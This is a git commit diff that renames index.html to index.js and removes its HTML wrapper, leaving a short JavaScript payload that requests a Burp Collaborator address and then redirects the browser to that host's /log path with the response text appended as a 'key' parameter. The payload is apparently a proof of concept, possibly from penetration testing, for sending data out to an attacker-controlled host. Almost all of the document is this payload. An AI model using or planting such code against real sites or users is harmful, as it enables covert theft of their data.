5d3a0c22555e2a841dde8dbd7159d18a6519b63c
johanrydbergmoller <56251044+johanrydbergmoller@users.noreply.github.com>
2021-10-21 15:19:27 +0200

    Update and rename index.html to index.js

--- index.js
+++ index.js
@@ -1,6 +1,3 @@
-<html>
-<body>
-<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('GET','http://918iap92vpmod1m99bib03gx7odf14.burpcollaborator.net',true);
@@ -9,6 +6,3 @@ req.send();
 function reqListener() {
 location='http://918iap92vpmod1m99bib03gx7odf14.burpcollaborator.net/log?key='+this.responseText;
 };
-</script>
-</body>
-</html>
